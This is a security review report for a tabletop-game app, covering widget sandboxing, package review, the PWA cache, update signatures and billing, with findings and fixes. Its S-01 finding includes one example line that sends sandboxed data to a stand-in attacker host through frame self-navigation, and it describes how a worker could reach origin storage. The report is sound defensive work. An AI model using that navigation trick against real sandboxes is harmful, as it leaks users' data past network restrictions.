# Whole-app security review v2 — 2026-10-14

Task: RC-ENG-5.1. Original assessment base: `81b6b34c85f88c9855c7e0ca5aab7f69b1bafdc2`.
Per-area review revision: **`7380afb4d91dceb6764061bc30d5dfd3977e98aa`** (2026-10-15), which
includes this task's H-01 and M-01 fixes.

**Status: no open High.** H-01 (custom worker code in the app's storage origin) is fixed by
failing closed. M-01 (wiki pages replayed from the offline cache) is fixed. Three Mediums remain
open with owner follow-ups: S-01 (sandbox self-navigation exfiltration), P-01 (package upgrade
bypasses the review gate) and V-01 (update-signature evidence). This report is not a release
sign-off.

## Findings register

| ID   | Severity | Area                         | Summary                                                                            | Disposition                                    |
| ---- | -------- | ---------------------------- | ---------------------------------------------------------------------------------- | ---------------------------------------------- |
| H-01 | High     | Sandbox host / private store | `sandbox: 'worker'` package code ran as a blob worker in the app origin            | **Fixed** `dc4da0010` (fail closed)            |
| M-01 | Medium   | PWA cache                    | Password-protected `/wikis` responses cached and replayable offline                | **Fixed** `05c30a41d`, `7380afb4d`             |
| S-01 | Medium   | Sandbox host                 | Frame self-navigation sends data out despite `connect-src 'none'`                  | Open, owner follow-up (below)                  |
| P-01 | Medium   | Package review               | `widget.package.upgrade` re-enables denied/disabled packages and keeps prior trust | Open, owner follow-up (below)                  |
| V-01 | Medium   | Auto-update signature        | No packaged-build evidence that a wrongly signed update is rejected on each OS     | Open, release-gate evidence                    |
| U-01 | Low      | Auto-update signature        | Linux AppImage updates are authenticated by TLS to GitHub plus an unsigned sha512  | Accepted (electron-updater design), documented |
| W-01 | Low      | PWA cache / sandbox host     | Hosted CSP still allows `worker-src blob:` though no package worker runs           | Open, tighten with the next infra change       |
| C-01 | Info     | System packages as data      | Formula function lookup reaches `Object.prototype` names; the arity check refuses  | No change needed; hardening noted              |
| D-01 | Info     | Player-private store         | Per-character databases are separated by name only; no at-rest encryption          | Accepted (device is trusted, ADR-035)          |

No Critical finding was identified. "Open" Mediums are not waived: each has a named follow-up.

## Method

The owner amendment of 2026-10-15 replaced "run `/security-review` on each PR" with a per-area
record, because the scoped areas landed as dispatcher integrations and the command is not available
to workers. Each section below names the reviewed paths, the commit that last touched each path
before the review revision, the checklist results, findings and dispositions.

The checklist was applied by hand to each area:

- **Injection**: markup, script, formula or query construction from untrusted input; path/key
  construction from request parameters.
- **AuthZ**: who may invoke each command or route; whether the authority check is server/core side.
- **Secrets**: credentials, tokens or signing material reachable from the area or logged by it.
- **Data exposure**: what data leaves its intended audience (actor filtering, caches, replication).
- **Sandbox escape**: whether untrusted code can reach origin storage, the host DOM, IPC or the
  network outside the host bridge.
- **Update / supply chain**: how new code or data enters (imports, upgrades, updater feed) and what
  authenticates it.

Findings were confirmed by reading the code at the review revision, and where noted by a scratch
test that was run and then deleted (not committed). No browser exploit was built, no production
account, private vault, credential or payment was used, and no deployed infrastructure was probed.

## Area 1 — Sandbox host (WID-1.3)

**Reviewed at `7380afb4d`:** `apps/gm-react/src/app/widgets/SandboxHost.tsx` (last `8bc8e0981`),
`apps/gm-react/public/widget-host.html` (`8bc8e0981`),
`packages/core/src/security/renderer-isolation.ts` (`4d1078e1a`),
`apps/gm-react/src/app/widgets/WorkerHost.ts` (`dc4da0010`),
`apps/gm-react/src/app/widgets/WidgetRenderSlot.tsx`, `infra/web-hosting/template.yaml` (`8d6cb7d8c`).

| Check          | Result                                                                                                                                                                                                      |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | Package HTML/CSS/JS is delivered in the `init` message to a served document. Nothing package-supplied is written into the host DOM.                                                                         |
| AuthZ          | Messages are accepted only when `event.source` is this frame's `contentWindow` (`SandboxHost.tsx:540`); `parseGuestMessage` drops anything off-channel or off-version.                                      |
| Secrets        | The frame has an opaque origin (`sandbox="allow-scripts"`, no `allow-same-origin`), so no cookies, storage or tokens. Render props carry no credentials.                                                    |
| Data exposure  | Render props are built by `resolveWidgetTemplateData` for the active actor; DM-audience queries are withheld from players. See S-01 for what a frame can send out.                                          |
| Sandbox escape | iframe: CSP `default-src 'none'; connect-src 'none'; form-action 'none'`, no popups or top navigation. Worker: **H-01** at the base; fixed, the factory now refuses before any blob URL or `Worker` exists. |
| Supply chain   | Package code enters only through install/upgrade (Area 3).                                                                                                                                                  |

**H-01 — High — fixed.** At the original base, `WidgetRenderSlot.tsx:551` routed
`sandbox: 'worker'` to `WorkerHost`, whose factory built a blob URL in the app context and
constructed a `Worker` from it. A blob worker keeps its creator's origin and has IndexedDB and
CacheStorage, and the hosted CSP permits `worker-src 'self' blob:`. Package code could therefore read
the vault and the player-private databases outside the host bridge
([MDN Worker](https://developer.mozilla.org/en-US/docs/Web/API/Worker/Worker),
[worker IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope/indexedDB)).
Source-based; no live exploit was built. **Disposition:** `dc4da0010` replaced the factory with
`refuseUnisolatedWorker`, which throws for classic and module entrypoints. `WidgetWorkerSession`
turns that into the "disabled, preserved" placeholder; package, configuration and placement are
untouched. `WorkerHost.test.ts` asserts that neither `Worker` nor `URL.createObjectURL` is called.
Re-enabling workers needs an opaque-origin context with a bridge-only channel and a real-browser
test under the hosted CSP, as a separate reviewed task.

**S-01 — Medium — open.** CSP `connect-src`, `img-src` and `form-action` do not govern a
document navigating its own browsing context, and the sandbox flags allow self-navigation. Package
script can set `location.href = 'https://attacker.example/?d=' + encodeURIComponent(data)` (or
emit a `<meta http-equiv="refresh">`) and send whatever its render props hold, even with the
`network` permission denied. CSP's `navigate-to` was dropped from the specification and never
shipped. After the navigation the host keeps posting `render` messages with target origin `*`
(`SandboxHost.tsx:414`) to whatever document is now in the frame. This is source and spec-based;
no browser reproduction was run.

Why Medium and not High: the data is limited to what that package's declared queries return for the
viewing actor (no tokens, no storage, no other widgets' data), and an enabled custom package is
needed. Why it matters: `WIDGETS.md` and the trust sheet treat a denied `network` permission as
"cannot send data", which is not true in a browser. **Disposition:** open; owner follow-up
story. (1) `SandboxHost` counts frame `load` events and isolates the frame on the second one, so
navigating away tears it down and stops further `render` posts. (2) Trust-sheet and `WIDGETS.md`
copy say that custom code can send out anything it is shown. Not fixed here: `SandboxHost.tsx` is
outside this task's claim and the fix needs its own browser test.

**Evidence:** `hostBridge.test.ts`, `WorkerHost.test.ts`, `WidgetRenderSlot.test.tsx` (part of the
84-test app run below); `security-widget-host-api.test.ts`, `security-widget-exfiltration.test.ts`.

## Area 2 — Host API

**Reviewed at `7380afb4d`:** `apps/gm-react/src/app/widgets/hostBridge.ts` (`8bc8e0981`),
`packages/core/src/security/widget-host-api.ts` (`5611f2362`),
`packages/core/src/security/widget-exfiltration.ts` (`d3d9c1798`),
`packages/core/src/commands/widget-command.ts` (`926d6a6f0`),
`apps/gm-react/src/app/widgets/dataEnvironment.ts` (`15c3bcf8a`),
`apps/gm-react/src/screens/board/useBoardActions.ts`.

| Check          | Result                                                                                                                                                                                                                                                  |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | `navigate` carries an intent id and optional target id, never a URL. `dispatch` payloads go into the core command envelope and are schema-checked there.                                                                                                |
| AuthZ          | `approvedHostPermissions` is empty unless the package is `trusted`. `widget.dispatch-command` re-checks the actor, scene visibility, assignment, binding, declared command and `decideWidgetCommandAuthority` in the core (`widget-command.ts:78-260`). |
| Secrets        | `FORBIDDEN_HOST_CAPABILITIES` (auth token, IPC, storage adapter, cloud client, raw vault file) are refused for any permission set.                                                                                                                      |
| Data exposure  | `outbound` is evaluated with `sensitiveDataPolicy: 'block'`, and even an allowed request is not sent: this build has no outbound transport for widgets.                                                                                                 |
| Sandbox escape | The bridge answers only typed protocol messages; no message gives the frame a reference to a host object.                                                                                                                                               |
| Supply chain   | Not applicable; permissions come from the package record (Area 3).                                                                                                                                                                                      |

**Findings:** none new in this area. The host API governs protocol calls only, not ambient
browser capabilities, which is why H-01 and S-01 are recorded against the sandbox host.
**Disposition:** no change needed. **Evidence:** `hostBridge.test.ts`,
`security-widget-host-api.test.ts`, `security-widget-exfiltration.test.ts`.

## Area 3 — Widget package review

**Reviewed at `7380afb4d`:** `packages/core/src/commands/widget-package.ts` (`59896482e`),
`packages/core/src/queries/widget-package-review.ts` (`83e83121f`),
`packages/core/src/state/widget-package-state.ts` (`findActiveWidgetDefinition`),
`apps/gm-react/src/platform/ShareImportDialog.tsx` (`ba35b10e9`),
`apps/gm-react/src/screens/community/moduleInstall.ts` (`95042e7f9`).

| Check          | Result                                                                                                                                                                                                            |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | Definitions are schema-validated; imported builtin runtimes are rejected; an approval for a permission the package never requested is refused (`handleReviewWidgetPackage`).                                      |
| AuthZ          | Every install/review/enable/disable/upgrade/fork handler calls `requireDm`. A fresh install is `unreviewed`, disabled, every permission denied. Author trust admits only template-only, permission-free packages. |
| Secrets        | None held.                                                                                                                                                                                                        |
| Data exposure  | Not applicable to the review flow itself.                                                                                                                                                                         |
| Sandbox escape | The review controls which permissions code gets; the code still runs only in the Area 1 sandbox.                                                                                                                  |
| Supply chain   | **P-01**: the upgrade path does not respect the review state.                                                                                                                                                     |

**P-01 — Medium — open.** `handleUpgradeWidgetPackage` writes `enabled: !failed` and keeps
`trust` unless an author-basis package stops qualifying. The share-import dialog and community
install both choose `widget.package.upgrade` when a live package with the same id exists. A scratch
core test at the review revision (run, then deleted) gave:

| Before upgrade                           | After upgrade with changed `main.js`      |
| ---------------------------------------- | ----------------------------------------- |
| `denied`, disabled (DM denied in review) | `denied`, **enabled**                     |
| `unreviewed`, disabled (fresh install)   | `unreviewed`, **enabled**                 |
| `trusted` (review), disabled by the DM   | `trusted`, **enabled**                    |
| `trusted` (review), `clipboard` approved | `trusted`, `clipboard` still **approved** |

So importing a same-id file twice runs code the DM never enabled, a package denied in review
runs again (contrary to RC-WID-1.5), and replacement code inherits earlier approvals.
`widget-author-trust.test.ts` asserts that review-basis trust survives an upgrade, so the last row is
current intended behavior, not a regression.

Why Medium and not High: the DM must perform the import, the code still runs only in the opaque-origin
sandbox, an unreviewed package can already be enabled by the DM on purpose
(`handleEnableWidgetPackage` refuses only `denied`), and approved permissions are capped (no
outbound transport; `navigate` only to declared intents under the viewer's read gate). Combined
with S-01, a swapped package can still send out what it is shown. **Disposition:** open; owner
follow-up story. Upgrade keeps `existing.enabled` and never enables a `denied` package. Review-basis
trust drops to `unreviewed` with permissions denied when code assets, host permissions or network
destinations change. The import dialog says "update" rather than "install". Not fixed here: the
command is outside this task's claim and the trust-retention rule is a product decision with a test
asserting the current behavior.

**Evidence:** `widget-trust-review.test.ts`, `widget-platform-review-fixes.test.ts`,
`widget-author-trust.test.ts` (in the 200-test core run below) plus the scratch test above.

## Area 4 — System packages as data

**Reviewed at `7380afb4d`:** `packages/core/src/schemas/system-package.ts` (`55b6c54fe`),
`packages/core/src/state/system-package.ts` (`24de81517`),
`packages/core/src/commands/system-package.ts` (`95042e7f9`).

| Check          | Result                                                                                                                                                                                                                             |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | Formulas use a hand-written tokenizer and recursive-descent parser over at most 200 characters; no `eval`/`Function`. Identifiers resolve only through `hasOwnProperty` on the supplied scope. Every schema object is `.strict()`. |
| AuthZ          | `system.select/define/update/delete/fork` all call `requireDm`.                                                                                                                                                                    |
| Secrets        | None held.                                                                                                                                                                                                                         |
| Data exposure  | Labels render as React text; app source (tests excluded) has no `dangerouslySetInnerHTML`, `innerHTML =` or `insertAdjacentHTML`.                                                                                                  |
| Sandbox escape | Not applicable: no executable content. Recursion depth is bounded by the 200-character limit.                                                                                                                                      |
| Supply chain   | Shared/community system packages go through the same `system.define` validation.                                                                                                                                                   |

**C-01 — Info.** `FORMULA_FUNCTIONS[token.value]` is a plain property read on a frozen ordinary
object, so `constructor(1)`, `toString()` and `__proto__(1)` find `Object.prototype` members. A
scratch evaluation at the review revision showed all of them refused with `reason: "arity"` because
those members have no `arity`. Nothing executes. **Disposition:** no change needed; an
`Object.hasOwn` guard would make the refusal explicit. **Evidence:** `system-package.test.ts`,
`system-package-commands.test.ts`, `system-package-portability.test.ts`, plus the scratch evaluation.

## Area 5 — Player-private store

**Reviewed at `7380afb4d`:** `apps/gm-react/src/platform/storage/privateStore.ts` (`98267e20b`),
`apps/gm-react/src/screens/play/PrivateJournal.tsx` (`4d0a9f2d7`), and a repo-wide search for
database enumeration (`indexedDB.databases`, `getDatabaseNames`, private database names).

| Check          | Result                                                                                                                                                                                        |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | Database names use `encodeURIComponent(characterId)`; an empty character id is refused.                                                                                                       |
| AuthZ          | The only exit is the explicit share command request, which the core authorizes.                                                                                                               |
| Secrets        | None stored.                                                                                                                                                                                  |
| Data exposure  | Only `PrivateJournal.tsx` imports the module (asserted by `privateStore.test.ts`). The only `indexedDB.databases()` caller is the Electron origin migration, which copies `dndtools-v2` only. |
| Sandbox escape | H-01 broke this guarantee for worker widgets; fixed. iframe widgets have an opaque origin and cannot open these databases.                                                                    |
| Supply chain   | Not applicable.                                                                                                                                                                               |

**D-01 — Info.** Separation between seats is by database name on one origin, without encryption,
so anyone with the browser profile can read every seat's notes with developer tools. This matches
the "local device is trusted" posture. **Disposition:** accepted; no change. **Evidence:**
`privateStore.test.ts`.

## Area 6 — PWA cache

**Reviewed at `7380afb4d`:** `apps/gm-react/src/sw/service-worker.js` (`7380afb4d`),
`apps/gm-react/src/platform/serviceWorker.ts`, `infra/web-hosting/template.yaml` (`8d6cb7d8c`),
`packages/cloud-fns/src/app-api/handler.ts` (wiki routes).

| Check          | Result                                                                                                                                                                                                                        |
| -------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | Not applicable.                                                                                                                                                                                                               |
| AuthZ          | Requests carrying `Authorization` or `x-wiki-password`, and every `/wikis` or `/api` path, skip cache reads, writes, precache admission and navigation fallback. `/wikis/*` is the only CloudFront path forwarded to the API. |
| Secrets        | Credential-bearing requests are never written.                                                                                                                                                                                |
| Data exposure  | **M-01** at the base; fixed. `no-store`/`private` responses evict an earlier copy. The `lamplight-private-v3-*` namespace retires older caches on activation.                                                                 |
| Sandbox escape | Not applicable.                                                                                                                                                                                                               |
| Supply chain   | Precached files are content-hashed; a new worker waits for the DM to accept the update.                                                                                                                                       |

**M-01 — Medium — fixed.** At `911d3ea9c` CloudFront forwarded `/wikis/*` to the API with
`x-wiki-password`, and `readWiki` returned protected pages without `private`/`no-store` or `Vary`,
so the worker cached them and later served them offline without the password. **Disposition:**
fixed by `05c30a41d` and `7380afb4d` as above. Workers already installed keep the old policy until
the user accepts the waiting update.

**W-01 — Low — open.** The hosted CSP still allows `worker-src 'self' blob:`, which no app path
needs now that package workers do not run. **Disposition:** tighten it with the next
`infra/web-hosting` change (outside this task's claim); first confirm that no app worker uses a blob
URL. Any future same-origin authenticated route needs an explicit bypass entry.

**Evidence:** `tests/unit/service-worker-security.test.ts` (14 tests: synthetic password read then
offline anonymous read, stale entries, navigation fallback, password-bearing precache, private
eviction, public assets, v2 cleanup), `serviceWorker.test.ts`. These are VM tests with mocked
browser APIs, not a real-browser proof.

## Area 7 — Auto-update signature

**Reviewed at `7380afb4d`:** `apps/gm-react/electron/updater.cjs` (`ec1dd91d8`),
`apps/gm-react/electron-builder.yml` (`95a018948`), `.github/workflows/release.yml`
(`b81861220`); `electron-updater` 6.8.9 from `pnpm-lock.yaml`.

| Check          | Result                                                                                                                                                                   |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Injection      | Release notes are flattened to capped plain text before reaching the renderer.                                                                                           |
| AuthZ          | Download and install need explicit DM actions; `autoDownload`, `autoInstallOnAppQuit` and `allowDowngrade` are off; `install()` refuses unless a download completed.     |
| Secrets        | Signing credentials reach release CI only through secrets; the production job fails when they are missing.                                                               |
| Data exposure  | Not applicable.                                                                                                                                                          |
| Sandbox escape | Not applicable.                                                                                                                                                          |
| Supply chain   | A packaged build ignores `LAMPLIGHT_UPDATE_FEED_URL` and uses the GitHub provider baked into `app-update.yml`. Per-OS authentication of the payload: **V-01**, **U-01**. |

**V-01 — Medium — open (evidence gap).** The updater comment calls the feed "signed", but the
sha512 in `latest*.yml` is a checksum inside an unsigned file, not a signature. By
electron-updater's documented behavior: Windows checks the installer's Authenticode publisher
against `publisherName` in `app-update.yml`, which is written only when the build was signed, so an
unsigned preview build's updates get no publisher check; macOS (Squirrel.Mac) requires the update's
code signature to satisfy the running app's designated requirement. None of this was observed in a
packaged build in this task. **Disposition:** release-gate evidence before a release sign-off.
Inspect the produced `app-update.yml` and `latest*.yml` per OS, and show that a wrongly signed
installer or app is rejected on Windows and macOS. Record preview (unsigned) behavior separately.

**U-01 — Low — accepted.** Linux AppImage updates have no publisher signature; integrity rests on
HTTPS to GitHub Releases and the sha512 in `latest-linux.yml`. Whoever can publish to the release
can ship the installers anyway, so this adds no new trust root. **Disposition:** accepted and
documented; revisit if AppImage signing is adopted. The updater comment overstates this, which is
part of the V-01 evidence work.

**Evidence:** source and workflow review only. No release build, update-install smoke or signature
check ran.

## Area 8 — Stripe webhook

**Reviewed at `7380afb4d`:** `packages/cloud-fns/src/billing/webhook.ts` (`95aa5f3ec`),
`packages/cloud-fns/src/billing/entitlements.ts` (`95aa5f3ec`), checkout routes in
`packages/cloud-fns/src/app-api/handler.ts` (`8d6cb7d8c`).

| Check          | Result                                                                                                                                                                                                         |
| -------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | Body capped at 256 KiB; the event comes only from `constructEvent` over the raw body.                                                                                                                          |
| AuthZ          | `Stripe-Signature` is verified (with Stripe's tolerance window) before any work; `livemode` must match the stage; failures return terse 400s.                                                                  |
| Secrets        | Secret key and webhook secret come from the billing runtime (SSM); errors log ids, not secrets; response bodies carry no internals.                                                                            |
| Data exposure  | The account link comes from subscription metadata or `client_reference_id`, both stamped from the caller's verified Cognito `sub` by our checkout route (`handler.ts:883`, `:937-940`), not from client input. |
| Sandbox escape | Not applicable.                                                                                                                                                                                                |
| Supply chain   | Event payloads are only triggers: the subscription is re-read from Stripe before anything is written, and processed event ids are recorded, so replay and reordering converge.                                 |

**Findings:** none. **Disposition:** no change needed. No live Stripe call was made.
**Evidence:** `packages/cloud-fns/src/billing/billing.test.ts` (in the 79-test cloud run below).

## Area 9 — Cloud-Enhanced path

**Reviewed at `7380afb4d`:** `packages/core/src/security/cloud-security-decision.ts` and
`cloud-security-model.ts` (`182805496`), `packages/cloud-fns/src/sync/handler.ts` (`cdd3102ba`),
`packages/cloud-fns/src/copilot/indexer.ts` (`75c76bd14`), `apps/gm-react/src/cloud/copilot.ts`
(`8036382f5`), `apps/gm-react/src/cloud/cloudSync.ts`.

| Check          | Result                                                                                                                                                                                                        |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Injection      | `vaultId` must decode to exactly `primary`; envelopes are rebuilt from an exact key set with size limits, so no extra field is stored.                                                                        |
| AuthZ          | The JWT authorizer's `sub` namespaces every key; read and write routes need a Lantern/Beacon entitlement, failing closed on read errors.                                                                      |
| Secrets        | Vault keys stay client-held; the server sees ciphertext plus the bounded metadata set.                                                                                                                        |
| Data exposure  | `DNDTOOLS_CLOUD_ENHANCED_SECURITY_DECISION_RECORD` is `approved: false`, so `isPlaintextUploadPermitted` is false on the client (`copilot.ts:36`) and on the server (`indexer.ts`, `requireReleaseApproval`). |
| Sandbox escape | Not applicable.                                                                                                                                                                                               |
| Supply chain   | Not applicable.                                                                                                                                                                                               |

**Findings:** none. This confirms the gate is closed; it does not approve the deferred
server-readable CLD-6 platform, which needs its own review before `approved` flips.
**Disposition:** no change needed. **Evidence:** `security-vault-privacy-modes.test.ts`,
`packages/cloud-fns/src/sync/handler.test.ts`.

## Executed regression evidence

Re-run at review revision `7380afb4d` on 2026-10-15. All four commands exited 0: **17 files,
377 tests**. Native output was inspected; it is kept in the run journal.

| Command                                                                                                                                                                                                                                                                                                                                                                                                | Result              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------- |
| `pnpm exec vitest run --config vitest.app.config.ts apps/gm-react/src/app/widgets/hostBridge.test.ts apps/gm-react/src/app/widgets/WorkerHost.test.ts apps/gm-react/src/app/widgets/WidgetRenderSlot.test.tsx apps/gm-react/src/platform/storage/privateStore.test.ts apps/gm-react/src/platform/serviceWorker.test.ts`                                                                                | 5 files / 84 tests  |
| `pnpm exec vitest run tests/unit/service-worker-security.test.ts`                                                                                                                                                                                                                                                                                                                                      | 1 file / 14 tests   |
| `pnpm --filter @dndtools/core exec vitest run tests/security-widget-host-api.test.ts tests/security-widget-exfiltration.test.ts tests/security-vault-privacy-modes.test.ts tests/system-package.test.ts tests/system-package-commands.test.ts tests/system-package-portability.test.ts tests/widget-trust-review.test.ts tests/widget-platform-review-fixes.test.ts tests/widget-author-trust.test.ts` | 9 files / 200 tests |
| `pnpm exec vitest run --config vitest.cloud.config.ts packages/cloud-fns/src/billing/billing.test.ts packages/cloud-fns/src/sync/handler.test.ts`                                                                                                                                                                                                                                                      | 2 files / 79 tests  |

The H-01 fix was also verified at `dc4da0010` with `pnpm typecheck`, ESLint and Prettier on the
changed files, and `tests/e2e/pwa-offline.spec.ts` on `desktop-chromium` and `mobile-chromium`
(18 passed). Those were not re-run for this revision.

Not run: dependency advisory audit, packaged update verification (V-01), full repository gates,
deployed-cloud checks, and browser reproductions of S-01 or P-01.

## Acceptance

- [x] No open High. H-01 is fixed; every other finding is Medium or lower with a disposition.
- [x] `docs/security/README.md` links this report and lists what is fixed and what is open.
- [x] Per-area review record for all nine scoped areas (owner amendment, 2026-10-15).
- [ ] V-01 evidence before a release sign-off.
- [ ] Owner follow-up stories for S-01, P-01 and W-01.

This report does not approve Cloud-Enhanced or certify release readiness.
